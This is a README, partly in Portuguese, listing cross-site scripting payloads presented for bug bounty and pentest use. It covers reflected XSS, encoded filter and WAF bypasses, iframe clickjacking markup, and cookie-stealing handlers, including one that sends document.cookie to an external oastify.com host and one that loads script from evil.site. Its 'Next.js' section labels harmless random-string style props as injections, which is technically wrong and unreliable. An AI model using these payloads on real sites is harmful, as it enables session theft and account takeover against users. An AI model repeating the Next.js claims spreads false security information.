# XSS-types

## Melhores Payloads de XSS para Bug Bounty/Pentest

Abaixo está payloads de XSS altamente eficaz para ser usado durante testes de segurança e caça de bugs.

![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)

## XSS Payloads

### Reflected XSS
```javascript
 `<button onClick="alert('xss')">submit</button>`
 `<Img%20Src=OnXSS%20OnError=confirm(1337)>`
 `<Img%20Src=OnXSS%20OnError=confirm(document.cookie)>`
 `”/>&_lt;_script>alert(1)&_lt;/scr_ipt>”/> stored`
 `abc`;return+false});});alert\`xss\`;</script>`
 `abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e`
 `\`;(alert)();//`
 `=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕`
 `<img src="xxxORxxx" onerror=alert('XSS')>`
 `x#12345<img src=x onerror=alert(1)>`
```
### Reflected XSS Example
```javascript
    <img src/onerror=prompt(document.cookie)>
```
### Bypass Techniques
```javascript
 `%27/confirm?.(%27BlackLine CH %27)/%27`
 `<img src="X" onerror=top
 `<input accessw']['one'+'rror']=alert;throw 1337;">`
 `"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F"`
 `/login?ReturnUrl=javascript:1&ReturnUrl=%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565n%2574%252e%2564%256f%256d%2561%2569%256e%2529`
 `<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click`
```

### Amazon WAF Bypass
```javascript
 `<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">`
```
## Lesser-Known XSS Payloads for Next.js

### Dynamic CSS Injection
```html
<div style={background-color: ${Math.random().toString(36).substr(2, 10)}}>XSS</div>
```

### CSS Variable Injection
```javascript
<div style={--var: ${Math.random().toString(36).substr(2, 10)}}>XSS</div>
```
### Object Literal Injection
```javascript
<div style={position: ${Math.random().toString(36).substr(2, 10)}}>XSS</div>
```
### CSS Flexbox Injection
```javascript
<div style={display: flex; justify-content: ${Math.random().toString(36).substr(2, 10)}}>XSS</div>
```
### Unicode Character Injection
```javascript
<div style={font-family: ${Math.random().toString(36).substr(2, 10)}}>XSS</div>
```
### Dynamic Font Injection
```javascript
<div style={font-family: ${Math.random().toString(36).substr(2, 10) + 'px'}}>XSS</div>
```
### CSS Animation Injection
```javascript
<div style={animation: ${Math.random().toString(36).substr(2, 10)}}>XSS</div>
```
### Web Font Injection
```javascript
<div style={font-family: ${Math.random().toString(36).substr(2, 10) + '-webfont'}}>XSS</div>
```
### CSS Grid Injection
```javascript
<div style={display: grid; grid-template-columns: ${Math.random().toString(36).substr(2, 10)}}>XSS</div>
```
### CSS Transform Injection
```javascript
<div style={transform: ${Math.random().toString(36).substr(2, 10)}}>XSS</div>
```
### SQL Injection Example
```javascript
    <font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;</font>
```

### Phishing / Clickjacking (IFrame Injection)
```javascript
<iframe src="https://www.cia.gov/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%"></iframe>
```
### Account Takeover (ATO)
```javascript
<img src=x onerror="document.location='http://o0p70yehe4avf6728g095671asgj49sy.oastify.com?c='+document.cookie;">
```
### Other XSS Examples
```javascript
    <img src=x onerror=alert(document.cookie)>
    <body onload=alert(document.cookie)>
    <div onclick="alert(document.cookie)">Click me!</div>
    <svg onload="alert(document.cookie)"><circle cx="0" cy="0" r="0"></circle></svg>
    <input type="text" onfocus="alert(document.cookie)">
    <a href="#" onmouseover="alert(document.cookie)">Hover me!</a>
    <input type="text" oninput="alert(document.cookie)">
    <button onclick="alert(document.cookie)">Click me!</button>
```

# **By**: Ivarsatierf


